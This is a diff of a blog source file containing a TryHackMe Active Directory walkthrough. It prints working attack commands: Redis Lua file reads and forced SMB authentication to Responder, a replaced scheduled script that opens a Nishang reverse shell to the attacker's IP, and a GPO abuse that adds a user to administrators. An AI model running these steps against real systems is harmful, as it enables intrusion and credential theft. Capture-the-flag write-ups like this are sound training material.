@@ -64,7 +64,7 @@ This room on tryhackme is all about active directory and domain controller. So l
 
 ![Initial Enumeration](/images/enum.jpg)
 
-Every domain controller services are up and running which is part of AD DC. But \`Kerberos\` is not running so we can not [AS-REP](https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/) roasting the usernames to check if they are valid.
+Every domain controller services are up and running which is part of AD DC. But \`Kerberos\` is not running so we can not <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast" class="text-emerald-400 hover:underline" target="_blank" rel="noopener noreferrer">AS-REP</a> roasting the usernames to check if they are valid.
 
 I ran the Nmap to scan all ports.
 
@@ -79,13 +79,16 @@ It confirms that no guest and a null session are allowed.
 
 **Redis exploitation**
 
-But my eyes got on to port 6379 (Redis). I was unaware of this but [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis) are always a good option to search for anything.
+But my eyes got on to port 6379 (Redis). I was unaware of this but <a href="https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis" class="text-emerald-400 hover:underline" target="_blank" rel="noopener noreferrer">hacktricks</a> are always a good option to search for anything.
 Redis is a No-sql database that stores information alongside key-value called keyspaces. The version of Redis key-value store 2.8.2402 is vulnerable to ssrf + CRLF.
 
 ![Redis Exploitation](/images/redis.jpg)
 
 Here we can exploit Redis via ssrf, but we must know the path to the windows server files
-\`redis-cli -h 10.10.245.19 eval "dofile('C:\\\\\\Users\\\\\\enterprise-security\\\\\\Desktop\\\\\\users.txt')" 0\`
+
+\`\`\`
+redis-cli -h 10.10.245.19 eval "dofile('C:\\\\\\Users\\\\\\enterprise-security\\\\\\Desktop\\\\\\users.txt')" 0
+\`\`\`
 
 ![Redis Command Execution](/images/redis_exp.jpg)
 
@@ -93,9 +96,13 @@ we got the users.txt flag. If we can get any files why not exploit further to ge
 
 I set up the responder from impacket, when users from the Redis server try to connect to our machine responder will log the hashes.
 
-\`sudo responder -I 10.9.0.31\`
+\`\`\`
+sudo responder -I 10.9.0.31
+\`\`\`
 
-\`redis-cli -h 10.10.245.19 eval "dofile('//10.9.0.31/test')" 0\`
+\`\`\`
+redis-cli -h 10.10.245.19 eval "dofile('//10.9.0.31/test')" 0
+\`\`\`
 
 ![Responder Hash Capture](/images/responder.jpg)
 
@@ -105,28 +112,39 @@ Since we got the user enterprise-security hash, we cracked with john the ripper 
 
 We have now a username and password, so we can enumerate allowed shares on smbserver. I tried to log into enterprise-Share on smb and successfully logged in.
 
-\`smbmap -H 10.10.155.156 -u enterprise-security -p pass\`
+\`\`\`
+smbmap -H 10.10.155.156 -u enterprise-security -p pass
+\`\`\`
 
 ![SMB Enumeration](/images/smbmap.jpg)
 
-\`smbclient //10.10.155.156/enterprise-share -U 'enterprise-security' pass\`
+\`\`\`
+smbclient //10.10.155.156/enterprise-share -U 'enterprise-security' pass
+\`\`\`
 
 ![SMB Client Access](/images/smbclient.jpg)
 
 There is a Powershell script scheduled to run, PurgeIrrelevantData_1826.ps1 with content.
-\`rm -Force C:\\Users\\Public\\Documents\\* -ErrorAction SilentlyContinue\`
+
+\`\`\`
+rm -Force C:\\Users\\Public\\Documents\\* -ErrorAction SilentlyContinue
+\`\`\`
 
 Maybe we can replace this script with a reverse shell. We do have written permission for this share.
 
 **Initial foothold**
 
-We use [Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) reverse shell to replace PurgeIrrelevantData_1826.ps1 and put it on the smb server overriding the same file and setting up Netcat listener to catch the shell.
+We use <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" class="text-emerald-400 hover:underline" target="_blank" rel="noopener noreferrer">Nishang</a> reverse shell to replace PurgeIrrelevantData_1826.ps1 and put it on the smb server overriding the same file and setting up Netcat listener to catch the shell.
 
 Add this line to the bottom of the script and wait for netcat to catch the shell.
 
-\`Invoke-PowerShellTcp -Reverse -IPAddress 10.9.0.31 -Port 4444\`
+\`\`\`
+Invoke-PowerShellTcp -Reverse -IPAddress 10.9.0.31 -Port 4444
+\`\`\`
 
-\`nc -lvnp 4444\`
+\`\`\`
+nc -lvnp 4444
+\`\`\`
 
 ![Reverse Shell Connection](/images/shell.jpg)
 
@@ -144,14 +162,20 @@ Here is the shortest path to the admin where we will be abusing one of the \`GPO
 
 We use \`SharpGPOAbuse.exe\` to escalate our privilege.
 
-\`.\SharpGPOAbuse.Exe AddComputerTask TaskName "babbadeckl_privesc" 
-Author vulnnet\\administrator Command "cmd.exe" Arguments "/c net localgroup administrators enterprise-security /add" GPOName "SECURITY-POL-VN"\`
+\`\`\`
+.\SharpGPOAbuse.Exe AddComputerTask TaskName "babbadeckl_privesc" Author vulnnet\\administrator Command "cmd.exe" Arguments "/c net localgroup administrators enterprise-security /add" GPOName "SECURITY-POL-VN"
+\`\`\`
 
-\`gpupdate \\force\`
+\`\`\`
+gpupdate /force
+\`\`\`
 
 We can access admin via smbclient.
-\`smbclient //10.10.56.175/C$ -U 'enterprise-security' sand_………...\`
-    `,
+
+\`\`\`
+smbclient //10.10.56.175/C$ -U 'enterprise-security' sand_………...
+\`\`\`
+      `,
       date: "2024-03-10",
       readingTime: "10 min read",
       tags: ["TryHackMe", "Active Directory", "Penetration Testing", "Walkthrough"],
